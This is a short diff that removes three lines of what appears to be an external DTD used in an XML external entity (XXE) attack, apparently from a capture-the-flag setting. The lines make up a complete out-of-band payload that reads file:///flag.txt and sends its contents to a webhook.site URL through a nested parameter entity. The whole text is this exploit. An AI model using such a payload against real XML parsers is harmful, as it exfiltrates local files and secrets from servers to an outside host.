@@ -1,3 +1,0 @@
-<!ENTITY % data SYSTEM "file:///flag.txt">
-<!ENTITY % param1 "<!ENTITY external SYSTEM 'https://webhook.site/98103f25-2b92-4b1a-ba4e-c771c7f0e967?data=%data;'>">
-%param1;
